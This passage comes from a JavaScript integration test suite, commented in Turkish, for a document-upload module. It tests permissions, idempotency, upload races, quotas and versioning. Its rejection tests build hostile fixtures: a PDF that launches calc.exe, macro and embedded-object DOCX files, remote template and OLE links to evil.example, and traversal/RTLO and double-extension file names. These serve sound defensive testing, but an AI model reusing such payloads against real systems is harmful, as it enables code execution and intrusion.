      (u) => wtx(async (c) => { await c.query(`UPDATE users SET full_name = full_name WHERE user_code = $1`, [u]); await sleep(2); await c.query(`UPDATE sites SET name = name WHERE site_code = $1`, [site.code]); }),
    ];
    let ensureErrors = 0;
    hooks.deadlocks = 0;
    for (let trial = 0; trial < 6; trial += 1) {
      await q(`DROP TABLE IF EXISTS announcement_attachments`);
      await q(`DROP TABLE IF EXISTS document_versions`);
      await q(`DROP TABLE IF EXISTS documents CASCADE`);
      running = true;
      for (let w = 0; w < 8; w += 1) loops.push((async () => { while (running) { await mixes[Math.floor(Math.random() * mixes.length)](wUsers[w]); await sleep(Math.floor(Math.random() * 3)); } })());
      await sleep(120);
      try {
        const ddlClient = await pool.connect();
        try {
          await ensureDocumentsSchema(ddlClient);
        } finally {
          ddlClient.release();
        }
      } catch (_error) {
        ensureErrors += 1;
      }
      running = false;
      await Promise.all(loops.splice(0));
    }
    await ensureDbSchema();
    await writerPool.end();
    const present = (await q(`SELECT to_regclass('public.documents') IS NOT NULL AS d, to_regclass('public.document_versions') IS NOT NULL AS v, to_regclass('public.announcement_attachments') IS NOT NULL AS a`)).rows[0];
    check(`A12 (R11 F1): sert yazici yuku (8 yazici; sites -> users / duyuru + TERS sirali users -> sites) altinda 6 kez ilk kurulum (ensureDocumentsSchema, tablolar yokken): DDL hatasi ${ensureErrors}, havuz 40P01 ${hooks.deadlocks}, yazici hatalari ${JSON.stringify(stats.errors)}; tablolar kuruldu`, ensureErrors === 0 && hooks.deadlocks === 0 && present.d && present.v && present.a, { ensureErrors, deadlocks: hooks.deadlocks, stats });
  }

  // ============================================================================================================
  // B. Modul kapisi ve yetki matrisi
  // ============================================================================================================
  console.log('--- B. modul kapisi ve yetki ---');
  const closedRes = await call('GET', base1(), MGR);
  check('B1: modul VARSAYILAN KAPALI: yonetici 403 MODULE_DISABLED { module: documents }', closedRes.status === 403 && closedRes.body.code === 'MODULE_DISABLED' && closedRes.body.module === 'documents', closedRes.body);
  check('B2: yonetici modulu kendisi acamaz (403); super acar (200)', (await call('PUT', `/manager/sites/${site.code}/modules/documents`, MGR, { enabled: true })).status === 403 && (await enableModule(site.code)).status === 200 && (await enableModule(site2.code)).status === 200);
  const matrix = [];
  for (const [label, user, expected] of [['super', SUPER, 200], ['yonetici', MGR, 200], ['kurul', BOARD, 200], ['gorevli', STAFF, 403], ['ilgisiz', OUTSIDER, 403], ['baska site yoneticisi', MGR2, 403]]) {
    matrix.push([label, (await call('GET', base1(), user)).status === expected]);
  }
  check('B3: liste yetki matrisi: super / yonetici / kurul 200; gorevli / ilgisiz / baska sitenin yoneticisi 403', matrix.every(([, passed]) => passed), matrix);
  check('B4: kimliksiz istek 401; kurul yazamaz (POST 403); gorevli indiremez', (await call('GET', base1(), null)).status === 401 && (await call('POST', base1(), BOARD, newDoc())).status === 403 && (await call('GET', base1('/1/download'), STAFF)).status === 403);

  // ============================================================================================================
  // C. Olusturma ve yukleme
  // ============================================================================================================
  console.log('--- C. olusturma ve yukleme ---');
  const first = await publish(MGR, { title: SECRET_TITLE, description: 'aciklama', audience: 'residents', file: { name: `${SECRET_FILE}.pdf`, size: PDF.length }, note: SECRET_NOTE });
  const firstId = first.id;
  check('C1: olustur 201 (pending, upload tanimi) + yukle 200 (active, v1, dosya adi kanonik)', first.created.status === 201 && first.created.body.document.status === 'pending' && first.created.body.upload.method === 'PUT' && first.uploaded.status === 200 && first.uploaded.body.document.status === 'active' && first.uploaded.body.document.current_version.version_no === 1 && first.uploaded.body.document.current_version.file_name === `${SECRET_FILE}.pdf`, { created: first.created.body, uploaded: first.uploaded.body });
  const storedRow = (await q(`SELECT storage_key, size_bytes, sha256, status, mime_type, scan_status FROM document_versions WHERE document_id = $1`, [firstId])).rows[0];
  const diskPath = pathForKey(storageRoot, storedRow.storage_key);
  const onDisk = await fsp.readFile(diskPath);
  check('C2: dosya diskte (<kok>/sites/<site>/<uuid>), icerik BAYT BAYT ayni, DB sha256 = diskteki sha256, boyut = gercek, tmp bos', Buffer.compare(onDisk, PDF) === 0 && storedRow.sha256 === crypto.createHash('sha256').update(PDF).digest('hex') && Number(storedRow.size_bytes) === PDF.length && (await tmpFiles()).length === 0 && storedRow.status === 'ready' && storedRow.scan_status === 'not_scanned', storedRow);
  if (process.platform !== 'win32') {
    check('C2b: dosya modu 0600, site dizini 0700', ((await fsp.stat(diskPath)).mode & 0o777) === 0o600 && ((await fsp.stat(path.dirname(diskPath))).mode & 0o777) === 0o700);
  }
  const auditRows = (await q(`SELECT action, target_type, target_id, details FROM audit_log WHERE site_code = $1 AND action LIKE 'document.%' ORDER BY id`, [site.code])).rows;
  check('C3: audit document.created yazildi (target document + kimlik; kategori / kitle / surum / boyut / MIME) ve baslik, dosya adi, not YOK', auditRows.some((r) => r.action === 'document.created' && r.target_type === 'document' && r.target_id === String(firstId) && r.details.category === 'regulation' && r.details.audience === 'residents' && r.details.version_no === 1 && r.details.size_bytes === PDF.length) && !JSON.stringify(auditRows).includes('GIZLI'), auditRows);

  // idempotans
  const dupKey = idemKey('replay');
  const replay1 = await call('POST', base1(), MGR, newDoc({ idempotency_key: dupKey }));
  const replay2 = await call('POST', base1(), MGR, newDoc({ idempotency_key: dupKey }));
  check('C4: ayni idempotency_key ile tekrar = ayni kayit (201, ayni belge kimligi ve ayni upload yolu); tek satir', replay1.status === 201 && replay2.status === 201 && replay1.body.document.id === replay2.body.document.id && replay1.body.upload.path === replay2.body.upload.path && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE idempotency_key = $1`, [dupKey])) === 1, { a: replay1.body, b: replay2.body });
  const raceKey = idemKey('race');
  const raceResults = await Promise.all(Array.from({ length: 8 }, () => call('POST', base1(), MGR, newDoc({ idempotency_key: raceKey }))));
  check('C5: ESZAMANLI 8 cift POST (ayni anahtar) TEK kayit olusturur; hepsi 201 ve ayni kimlik', raceResults.every((r) => r.status === 201) && new Set(raceResults.map((r) => r.body.document.id)).size === 1 && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE idempotency_key = $1`, [raceKey])) === 1, raceResults.map((r) => r.status));
  const dupUp = await rawPut(replay1.body.upload.path, MGR, PDF);
  const dupUp2 = await rawPut(replay1.body.upload.path, MGR, PDF);
  const replayAfter = await call('POST', base1(), MGR, newDoc({ idempotency_key: dupKey }));
  check('C6: yukleme tamamlandiktan sonra ayni anahtarla POST ayni belgeyi dondurur (upload null); ikinci PUT 409 UPLOAD_ALREADY_COMPLETED + belge', dupUp.status === 200 && dupUp2.status === 409 && dupUp2.body.code === 'UPLOAD_ALREADY_COMPLETED' && dupUp2.body.document.id === replay1.body.document.id && replayAfter.body.upload === null && replayAfter.body.document.status === 'active', { dupUp2: dupUp2.body, replayAfter: replayAfter.body });

  // eszamanli cift PUT
  await expirePending();
  const dblCreated = await call('POST', base1(), MGR, newDoc({}, makePdf({ padding: 600000 })));
  const dblBytes = makePdf({ padding: 600000 });
  const dblPuts = await Promise.all([rawPut(dblCreated.body.upload.path, MGR, dblBytes), rawPut(dblCreated.body.upload.path, MGR, dblBytes), rawPut(dblCreated.body.upload.path, MGR, dblBytes)]);
  const dblStatuses = dblPuts.map((r) => r.status).sort();
  check('C7: ESZAMANLI 3 PUT: tam olarak bir 200; digerleri 409 (UPLOAD_IN_PROGRESS / UPLOAD_ALREADY_COMPLETED); tek dosya, tmp kalinti yok', dblStatuses.filter((s) => s === 200).length === 1 && dblStatuses.filter((s) => s === 409).length === 2 && (await tmpFiles()).length === 0 && (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1 AND status = 'ready'`, [dblCreated.body.document.id])) === 1, dblPuts.map((r) => [r.status, r.body?.code]));

  // tur / icerik kapilari (gercek HTTP + gercek disk)
  await expirePending();
  const gateCases = [
    ['EXE baytlari .pdf adiyla', EXE_BYTES, 'x.pdf', 415, 'DOCUMENT_TYPE_NOT_ALLOWED'],
    ['PNG icerigi .pdf adiyla', makePng(), 'x.pdf', 415, 'DOCUMENT_CONTENT_MISMATCH'],
    ['kesik PDF', makePdf({ eof: false }), 'x.pdf', 415, 'DOCUMENT_CONTENT_MISMATCH'],
    ['/Launch iceren PDF', makePdf({ extra: '/OpenAction << /S /Launch /F (calc.exe) >>' }), 'x.pdf', 415, 'DOCUMENT_ACTIVE_CONTENT'],
    ['JPEG icerigi .png adiyla', makeJpeg(), 'x.png', 415, 'DOCUMENT_CONTENT_MISMATCH'],
    ['makrolu DOCX (vbaProject.bin)', makeDocx({ extra: [{ name: 'word/vbaProject.bin', data: 'x' }] }), 'x.docx', 415, 'DOCUMENT_ACTIVE_CONTENT'],
    ['DOCX icerigi .xlsx adiyla', makeDocx(), 'x.xlsx', 415, 'DOCUMENT_CONTENT_MISMATCH'],
    // R16 P2-1: ad kalibina degil ICERIGE dayanan denetim (karakter basvurusu ile gizlenmis dis oleObject iliskisi; UTF-16 [Content_Types].xml + macroEnabled)
    ['DOCX dis oleObject iliskisi (TargetMode karakter basvurusu ile gizli)', makeDocx({ extra: [{ name: 'word/_rels/document.xml.rels', data: '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://evil.example/x.html!" TargetMode="&#69;xternal"/></Relationships>', method: 8 }] }), 'x.docx', 415, 'DOCUMENT_ACTIVE_CONTENT'],
    ['UTF-16 [Content_Types].xml + macroEnabled DOCX', makeDocx({ contentTypes: Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(MACRO_CONTENT_TYPES, 'utf16le')]) }), 'x.docx', 415, 'DOCUMENT_ACTIVE_CONTENT'],
  ];
  const gateResults = [];
  for (const [label, bytes, name, status, code] of gateCases) {
    await expirePending();
    const created = await call('POST', base1(), MGR, newDoc({ file: { name, size: bytes.length } }, bytes));
    const put = await rawPut(created.body.upload.path, MGR, bytes);
    gateResults.push([label, put.status === status && put.body.code === code && (await tmpFiles()).length === 0]);
  }
  check('C8: icerik kapilari (gercek akis): tum reddedilenlerde 415 + dogru kod, _tmp bos, son dosya olusmaz', gateResults.every(([, passed]) => passed), gateResults);
  const reasonCases = [];
  for (const [label, bytes, reason, messagePattern] of [
    ['gomulu nesne (embeddings/eski.xls)', makeDocx({ extra: [{ name: 'word/embeddings/eski.xls', data: Buffer.alloc(32, 1) }] }), 'embedded', /Gömülü nesne/],
    ['makro (vbaProject.bin)', makeDocx({ extra: [{ name: 'word/vbaProject.bin', data: 'x' }] }), 'macro', /Makro/],
    ['uzak sablon (settings.xml.rels attachedTemplate)', makeDocx({ extra: [{ name: 'word/_rels/settings.xml.rels', data: '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>', method: 8 }] }), 'external', /Uzak şablon/],
  ]) {
    await expirePending();
    const created = await call('POST', base1(), MGR, newDoc({ file: { name: 'x.docx', size: bytes.length } }, bytes));
    const put = await rawPut(created.body.upload.path, MGR, bytes);
    reasonCases.push([label, put.status === 415 && put.body.code === 'DOCUMENT_ACTIVE_CONTENT' && put.body.reason === reason && messagePattern.test(put.body.error ?? put.body.message ?? ''), put.body]);
  }
  check('C8b (R16 P2-1): DOCUMENT_ACTIVE_CONTENT yaniti `reason` tasir ve ileti NEDENE gore dogrudur (gomulu nesne "betik, makro" diye anilmaz)', reasonCases.every(([, passed]) => passed) && !/betik|makro/i.test(reasonCases[0][2].error ?? reasonCases[0][2].message ?? ''), reasonCases);
  await expirePending();
  const ok5 = [];
  for (const [bytes, name] of [[makeJpeg(), 'foto.jpeg'], [makePng(), 'cizim.png'], [makeDocx(), 'sozlesme.docx'], [makeXlsx(), 'tablo.xlsx'], [makePdf(), 'tutanak']]) {
    const r = await publish(MGR, { file: { name, size: bytes.length } }, bytes);
    ok5.push([name, r.uploaded?.status, r.uploaded?.body?.document?.current_version?.file_name]);
  }
  check('C9: JPEG / PNG / DOCX / XLSX ve uzantisiz PDF kabul edilir; uzantisiz ad kanonik uzantiyi alir (tutanak -> tutanak.pdf); jpeg -> jpg', ok5.every(([, s]) => s === 200) && ok5[0][2] === 'foto.jpg' && ok5[4][2] === 'tutanak.pdf', ok5);
  const sizeCreated = await call('POST', base1(), MGR, newDoc({}, PDF));
  const mismatchPut = await rawPut(sizeCreated.body.upload.path, MGR, Buffer.concat([PDF, Buffer.from('FAZLA')]));
  const shortPut = await rawPut(sizeCreated.body.upload.path, MGR, PDF.subarray(0, PDF.length - 10));
  const jsonPut = await call('PUT', sizeCreated.body.upload.path, MGR, { a: 1 });
  check('C10: boyut uyusmazligi (fazla / eksik) 400 DOCUMENT_SIZE_MISMATCH; JSON govde 415 INVALID_CONTENT_TYPE; hicbirinde dosya / tmp kalinti yok; surum uploading kalir', mismatchPut.status === 400 && mismatchPut.body.code === 'DOCUMENT_SIZE_MISMATCH' && shortPut.status === 400 && shortPut.body.code === 'DOCUMENT_SIZE_MISMATCH' && jsonPut.status === 415 && jsonPut.body.code === 'INVALID_CONTENT_TYPE' && (await tmpFiles()).length === 0 && (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1 AND status = 'uploading'`, [sizeCreated.body.document.id])) === 1);
  const afterRetry = await rawPut(sizeCreated.body.upload.path, MGR, PDF);
  check('C11: hatali denemeden sonra DOGRU dosya ayni yukleme tanimina yuklenebilir (yeniden deneme)', afterRetry.status === 200);

  // sinirlar: ad guvenligi
  const nasty = await publish(MGR, { file: { name: `../../etc/passwd${String.fromCodePoint(0x202e)}gpj.pdf`, size: PDF.length } });
  const nastyName = (await q(`SELECT display_name, storage_key FROM document_versions WHERE document_id = $1`, [nasty.id])).rows[0];
  check('C12: tehlikeli dosya adi (../, RTLO) temizlenir; yola GIRMEZ (anahtar uuid); gorunen ad guvenli', nasty.uploaded?.status === 200 && !/[\\/]/.test(nastyName.display_name) && !nastyName.display_name.includes(String.fromCodePoint(0x202e)) && /^\d{10}\/[0-9a-f-]{36}$/.test(nastyName.storage_key), nastyName);
  const exeNamed = await call('POST', base1(), MGR, newDoc({ file: { name: 'rapor.pdf.exe', size: 100 } }));
  check('C13: rapor.pdf.exe (cift uzanti) olusturma asamasinda 415 DOCUMENT_TYPE_NOT_ALLOWED; boyut 10 MB ustu 413; bos 400', exeNamed.status === 415 && exeNamed.body.code === 'DOCUMENT_TYPE_NOT_ALLOWED' && (await call('POST', base1(), MGR, newDoc({ file: { name: 'a.pdf', size: 10485761 } }))).status === 413 && (await call('POST', base1(), MGR, newDoc({ file: { name: 'a.pdf', size: 0 } }))).status === 400);


  // R9 F2: yukleme yarisi (zamanlama kancasi) ve son yolda dosya varken tamamlama
  await expirePending();
  const raceA = markerPdf('ICERIK-AAAAAAAA');
  const raceB = markerPdf('ICERIK-BBBBBBBB');
  const raceCreated = await call('POST', base1(), MGR, newDoc({}, raceA));
  const racePath = raceCreated.body.upload.path;
  const realPoolQuery = pool.query;
  let holdOpen = true;
  let releaseHold = () => {};
  const holdGate = new Promise((resolve) => { releaseHold = resolve; });
  let heldSeen = () => {};
  const heldSeenPromise = new Promise((resolve) => { heldSeen = resolve; });
  pool.query = function holdTargetQuery(text, params) {
    if (holdOpen && typeof text === 'string' && text.includes(TARGET_QUERY)) {
      holdOpen = false;
      // sorgu HEMEN calisir ("uploading" anlik goruntusu alinir) ama sonucu birakilana kadar tutulur
      return realPoolQuery.call(pool, text, params).then(async (result) => {
        heldSeen(result.rows?.[0]?.version_status);
        await holdGate;
        return result;
      });
    }
    return realPoolQuery.call(pool, text, params);
  };
  let raceFirst;
  let raceSecond;
  let heldStatus;
  try {
    const firstPromise = rawPut(racePath, MGR, raceB);
    heldStatus = await heldSeenPromise;
    raceSecond = await rawPut(racePath, MGR, raceA); // eskiden bu istek tamamlanip ready dosyanin uzerine yazabiliyordu
    releaseHold();
    raceFirst = await firstPromise;
  } finally {
    holdOpen = false;
    releaseHold();
    pool.query = realPoolQuery;
  }
  const raceRow = (await q(`SELECT storage_key, sha256, status FROM document_versions WHERE document_id = $1`, [raceCreated.body.document.id])).rows[0];
  const raceDisk = await fsp.readFile(pathForKey(storageRoot, raceRow.storage_key));
  const raceFsck = await runFsck({ root: storageRoot, verifyHash: true });
  const raceFsckBad = [...raceFsck.missing, ...raceFsck.size_mismatch, ...raceFsck.hash_mismatch].filter((entry) => entry.storage_key === raceRow.storage_key);
  check('C13b (R9 F2): AYNI surume yarisan ikinci PUT, ilkinin hedef sorgusunda BEKLEDIGI sirada (anlik goruntu uploading) aninda 409 UPLOAD_IN_PROGRESS alir; ilk yukleme tamamlanir; dosya + DB sha256 TUTARLI (yalniz ilk yuklemenin baytlari); fsck bu sürüm icin temiz',
    heldStatus === 'uploading' && raceSecond.status === 409 && raceSecond.body.code === 'UPLOAD_IN_PROGRESS' && raceFirst.status === 200 && raceRow.status === 'ready' && raceRow.sha256 === sha256Of(raceB) && raceDisk.equals(raceB) && raceFsckBad.length === 0 && (await tmpFiles()).length === 0,
    { heldStatus, second: [raceSecond.status, raceSecond.body?.code], first: raceFirst.status, raceFsckBad });

  await expirePending();
  const leftBytes = markerPdf('ICERIK-CCCCCCCC');
  const leftCreated = await call('POST', base1(), MGR, newDoc({}, leftBytes));
  const leftKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [leftCreated.body.document.id])).rows[0].storage_key;
  await fsp.mkdir(path.join(storageRoot, 'sites', String(site.code)), { recursive: true });
  await fsp.writeFile(pathForKey(storageRoot, leftKey), 'ONCEKI-DENEMENIN-ARTIGI');
  const leftPut = await rawPut(leftCreated.body.upload.path, MGR, leftBytes);
  const leftRow = (await q(`SELECT sha256, status FROM document_versions WHERE document_id = $1`, [leftCreated.body.document.id])).rows[0];
  check('C13c (R9 F2): son yolda onceki denemenin ARTIGI varken (surum hala uploading) yukleme basarili: dosya atomik degistirilir, DB sha256 = yuklenen bayt, tmp kalmaz',
    leftPut.status === 200 && leftRow.status === 'ready' && leftRow.sha256 === sha256Of(leftBytes) && (await fsp.readFile(pathForKey(storageRoot, leftKey))).equals(leftBytes) && (await tmpFiles()).length === 0, leftPut.body);

  await expirePending();
  const readyBytes = markerPdf('ICERIK-DDDDDDDD');
  const readyDoc = await publish(MGR, {}, readyBytes);
  const readyRow = (await q(`SELECT storage_key, sha256 FROM document_versions WHERE document_id = $1`, [readyDoc.id])).rows[0];
  const readyUpload = readyDoc.created.body.upload.path;
  const realQuery2 = pool.query;
  // bayat anlik goruntu simulasyonu (baska surecin ayni anda tamamlamasi): hedef sorgusu surumun durumunu YANLIS ("uploading") raporlar
  pool.query = function staleSnapshot(text, params) {
    const pending = realQuery2.call(pool, text, params);
    if (typeof text === 'string' && text.includes(TARGET_QUERY)) {
      return pending.then((result) => ({ ...result, rows: (result.rows ?? []).map((row) => ({ ...row, version_status: 'uploading' })) }));
    }
    return pending;
  };
  let staleRes;
  try {
    staleRes = await rawPut(readyUpload, MGR, markerPdf('ICERIK-EEEEEEEE'));
  } finally {
    pool.query = realQuery2;
  }
  const readyRowAfter = (await q(`SELECT sha256, status FROM document_versions WHERE document_id = $1`, [readyDoc.id])).rows[0];
  check('C13d (R9 F2): son yolda dosya VAR ve DB\'de surum ready iken (bayat anlik goruntu) ikinci gonderim 409 UPLOAD_ALREADY_COMPLETED alir; HAZIR dosya ve DB sha256 DEGISMEZ; tmp kalmaz',
    staleRes.status === 409 && staleRes.body.code === 'UPLOAD_ALREADY_COMPLETED' && readyRowAfter.status === 'ready' && readyRowAfter.sha256 === readyRow.sha256 && (await fsp.readFile(pathForKey(storageRoot, readyRow.storage_key))).equals(readyBytes) && (await tmpFiles()).length === 0, staleRes.body);

  // ============================================================================================================
  // D. Kota rezervasyonu ve sinirlar
  // ============================================================================================================
  console.log('--- D. kota ---');
  const quotaSite = await mkSite('Kota Sitesi', { 'A Blok': 2 });
  const QM = await mkUser('Kota Yoneticisi', 'site_manager');
  await linkManager(quotaSite.code, QM);
  await enableModule(quotaSite.code);
  const qBase = `/manager/sites/${quotaSite.code}/documents`;
  process.env.DOCUMENTS_SITE_QUOTA_BYTES = String(1048576 + 500000); // 1.5 MiB
  const quotaBytes = makePdf({ padding: 400000 });
  const qResults = await Promise.all(Array.from({ length: 8 }, () => call('POST', qBase, QM, newDoc({ file: { name: 'k.pdf', size: quotaBytes.length } }, quotaBytes))));
  const qOk = qResults.filter((r) => r.status === 201).length;
  const qFull = qResults.filter((r) => r.status === 409 && r.body.code === 'DOCUMENT_QUOTA_EXCEEDED').length;
  const reserved = Number((await q(`SELECT COALESCE(SUM(size_bytes), 0)::bigint AS n FROM document_versions WHERE site_code = $1`, [quotaSite.code])).rows[0].n);
  check(`C14: ESZAMANLI 8 olusturma x kota 1.5 MiB: rezervasyon ASLA asilmaz (basarili ${qOk}, kota dolu ${qFull}, rezerve ${reserved} <= 1548576); en fazla 3`, qOk >= 1 && qOk <= 3 && qOk + qFull === 8 && reserved <= 1548576 && reserved === qOk * quotaBytes.length, qResults.map((r) => r.status));
  const quotaMsg = qResults.find((r) => r.status === 409)?.body;
  check('C14b: 409 DOCUMENT_QUOTA_EXCEEDED govdesi kullanilan / kota MB + "kalici silin" ve used_bytes / quota_bytes', quotaMsg && /MB/.test(quotaMsg.error) && /kalıcı/.test(quotaMsg.error) && quotaMsg.quota_bytes === 1548576, quotaMsg);
  const quotaListed = await call('GET', qBase, QM);
  check('C14c: liste usage { used_bytes, quota_bytes, document_count, document_limit } rezervasyonu gosterir', quotaListed.body.usage.used_bytes === reserved && quotaListed.body.usage.quota_bytes === 1548576 && quotaListed.body.usage.document_limit === 2000 && quotaListed.body.usage.document_count === qOk, quotaListed.body.usage);
  // rezervasyon yuklenmeden de sayilir; yuklenen belge silinse bile (yumusak) sayilir; kalici silinince kota duser
  const okIds = qResults.filter((r) => r.status === 201).map((r) => r.body.document.id);
  const upFirst = await rawPut(qResults.find((r) => r.status === 201).body.upload.path, QM, quotaBytes);
  const softDeleted = await call('DELETE', `${qBase}/${okIds[0]}`, QM, {});
  const stillCounted = await call('GET', qBase, QM);
  check('C15: yumusak silinen belge kotada SAYILMAYA devam eder; kalici silme kotayi dusurur', upFirst.status === 200 && softDeleted.status === 200 && stillCounted.body.usage.used_bytes === reserved);
  const purged = await call('POST', `${qBase}/${okIds[0]}/purge`, QM, { confirm: true });
  const afterPurge = await call('GET', qBase, QM);
  check('C15b: kalici silme: dosya + satir gider, kota duser', purged.status === 200 && afterPurge.body.usage.used_bytes === reserved - quotaBytes.length && (await diskFiles(quotaSite.code)).length === 0, afterPurge.body.usage);
  // belge sayisi sinirlari
  process.env.DOCUMENTS_SITE_QUOTA_BYTES = String(200 * 1048576);
  process.env.DOCUMENTS_MAX_PER_SITE = '3';
  const limitResults = [];
  for (let i = 0; i < 3; i += 1) limitResults.push((await call('POST', qBase, QM, newDoc({}, PDF))).status);
  delete process.env.DOCUMENTS_MAX_PER_SITE;
  check('C16: DOCUMENTS_MAX_PER_SITE=3 asilinca 409 DOCUMENT_LIMIT (document_limit govdede)', limitResults.includes(409));
  process.env.DOCUMENTS_MAX_PER_SITE = '3';
  const limited = await call('POST', qBase, QM, newDoc({}, PDF));
  delete process.env.DOCUMENTS_MAX_PER_SITE;
  check('C16b: ayni sinirin dogrudan kontrolu', limited.status === 409 && limited.body.code === 'DOCUMENT_LIMIT' && limited.body.document_limit === 3, limited.body);
  // kullanici basina bekleyen (uploading) <= 5
  const pendingSite = await mkSite('Bekleyen Sitesi', { 'A Blok': 1 });
  const pendUser = await mkUser('Bekleyen Yonetici', 'site_manager');
  await linkManager(pendingSite.code, pendUser);
  await enableModule(pendingSite.code);
  const pendStatuses = [];
  for (let i = 0; i < 7; i += 1) pendStatuses.push((await call('POST', `/manager/sites/${pendingSite.code}/documents`, pendUser, newDoc({}, PDF))).status);
  check('C17: kullanici basina en cok 5 bekleyen (uploading) yukleme: 6. ve 7. 409 UPLOAD_PENDING_LIMIT', pendStatuses.filter((s) => s === 201).length === 5 && pendStatuses.slice(5).every((s) => s === 409), pendStatuses);

  // ============================================================================================================
  // E. Surumler
  // ============================================================================================================
  console.log('--- E. surumler ---');
  await expirePending();
  const v1 = await publish(MGR, { audience: 'residents', title: 'Surumlu Belge' }, makePdf({ padding: 100 }));
  const docId = v1.id;
  const v2bytes = makePdf({ padding: 300 });
  const v2new = await call('POST', base1(`/${docId}/versions`), MGR, { file: { name: 'surum2.pdf', size: v2bytes.length }, note: 'ikinci' });
  const v2again = await call('POST', base1(`/${docId}/versions`), MGR, { file: { name: 'surum2b.pdf', size: v2bytes.length } });
  check('E1: yeni surum 201 (v2 uploading); AYNI belgede bekleyen varken tekrar istek bekleyeni YENILER (ayni surum no, yeni yol)', v2new.status === 201 && v2again.status === 201 && v2new.body.version.version_no === 2 && v2again.body.version.version_no === 2 && (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1`, [docId])) === 2, { a: v2new.body, b: v2again.body });
  const v2put = await rawPut(v2again.body.upload.path, MGR, v2bytes);
  const afterV2 = await call('GET', base1(`/${docId}`), MGR);
  check('E2: v2 yuklenince guncel surum 2; version_count = 2; surum listesi (is_current); sakin YALNIZ guncel surumu indirir', v2put.status === 200 && afterV2.body.current_version.version_no === 2 && afterV2.body.version_count === 2 && afterV2.body.versions.length === 2 && afterV2.body.versions[0].is_current === true && afterV2.body.versions[1].is_current === false, afterV2.body);
  const v3bytes = makePdf({ padding: 900 });
  const v3 = await call('POST', base1(`/${docId}/versions`), MGR, { file: { name: 'surum3.pdf', size: v3bytes.length } });
  await rawPut(v3.body.upload.path, MGR, v3bytes);
  const dlV1 = await call('GET', base1(`/${docId}/download?version=1`), MGR);
  const dlV2 = await call('GET', base1(`/${docId}/download?version=2`), MGR);
  const dlCurrent = await call('GET', base1(`/${docId}/download`), MGR);
  check('E3: ?version= verilen surumu indirir (v1/v2), parametresiz guncel (v3); basliklar tam', dlV1.status === 200 && Buffer.compare(dlV1.raw, makePdf({ padding: 100 })) === 0 && Buffer.compare(dlV2.raw, v2bytes) === 0 && Buffer.compare(dlCurrent.raw, v3bytes) === 0 && dlCurrent.headers.get('x-content-type-options') === 'nosniff' && /^attachment; filename="/.test(dlCurrent.headers.get('content-disposition')) && dlCurrent.headers.get('cache-control') === 'private, no-store');
  const delCurrent = await call('DELETE', base1(`/${docId}/versions/3`), MGR);
  const afterDel = await call('GET', base1(`/${docId}`), MGR);
  const keyOfV3 = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1 AND version_no = 3`, [docId])).rows;
  check('E4: guncel surum silinince en yuksek kalan ready (v2) guncel olur; dosya HEMEN silinir; version_count 2', delCurrent.status === 200 && afterDel.body.current_version.version_no === 2 && afterDel.body.version_count === 2 && keyOfV3.length === 0, afterDel.body);
  await call('DELETE', base1(`/${docId}/versions/2`), MGR);
  const lastDel = await call('DELETE', base1(`/${docId}/versions/1`), MGR);
  check('E5: en az bir ready surum kalmali: son surumun silinmesi 409 INVALID_STATE; olmayan surum 404', lastDel.status === 409 && lastDel.body.code === 'INVALID_STATE' && (await call('DELETE', base1(`/${docId}/versions/99`), MGR)).body.code === 'DOCUMENT_VERSION_NOT_FOUND');
  // yaris: yeni surum yukleme x surum silme x guncel secimi
  const raceDoc = await publish(MGR, { audience: 'managers' }, makePdf({ padding: 50 }));
  const raceOps = [];
  for (let round = 0; round < 4; round += 1) {
    raceOps.push((async () => {
      const bytes = makePdf({ padding: 100 + round * 37 });
      const created = await call('POST', base1(`/${raceDoc.id}/versions`), MGR, { file: { name: `r${round}.pdf`, size: bytes.length } });
      if (created.status === 201) await rawPut(created.body.upload.path, MGR, bytes);
    })());
    raceOps.push(call('DELETE', base1(`/${raceDoc.id}/versions/${1 + round}`), MGR));
  }
  await Promise.all(raceOps);
  const raceState = (await q(`SELECT d.current_version_no, d.version_count, (SELECT COUNT(*)::int FROM document_versions v WHERE v.document_id = d.id AND v.status = 'ready') AS ready, (SELECT MAX(v.version_no) FROM document_versions v WHERE v.document_id = d.id AND v.status = 'ready') AS max_ready, EXISTS (SELECT 1 FROM document_versions v WHERE v.document_id = d.id AND v.version_no = d.current_version_no AND v.status = 'ready') AS current_ok FROM documents d WHERE d.id = $1`, [raceDoc.id])).rows[0];
  const missingFiles = await runFsck({ root: storageRoot });
  check('E6: ESZAMANLI yeni surum x surum silme x guncel secimi: guncel surum var ve ready, version_count = ready sayisi, en az 1 ready, dosya kaybi yok', raceState.current_ok === true && raceState.version_count === raceState.ready && raceState.ready >= 1 && missingFiles.missing.length === 0 && missingFiles.size_mismatch.length === 0, { raceState, missing: missingFiles.missing });
  process.env.DOCUMENTS_MAX_PER_SITE = '2000';
  const manyDoc = await publish(MGR, {}, makePdf({ padding: 10 }));
  let versionStatuses = [];
  for (let i = 0; i < 22; i += 1) {
    const bytes = makePdf({ padding: 20 + i });
    const created = await call('POST', base1(`/${manyDoc.id}/versions`), MGR, { file: { name: `m${i}.pdf`, size: bytes.length } });
    versionStatuses.push(created.status);
    if (created.status === 201) await rawPut(created.body.upload.path, MGR, bytes);
  }
  check('E7: belge basina en cok 20 surum: 21. surum 409 DOCUMENT_VERSION_LIMIT', versionStatuses.filter((s) => s === 201).length === 19 && versionStatuses.filter((s) => s === 409).length === 3, versionStatuses);

  // ============================================================================================================
  // F. Yumusak silme, geri alma, kalici silme
  // ============================================================================================================
  console.log('--- F. silme yasam dongusu ---');
  await expirePending();
  const life = await publish(MGR, { audience: 'residents', title: 'Yasam Dongusu' });
  const lifeKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [life.id])).rows[0].storage_key;
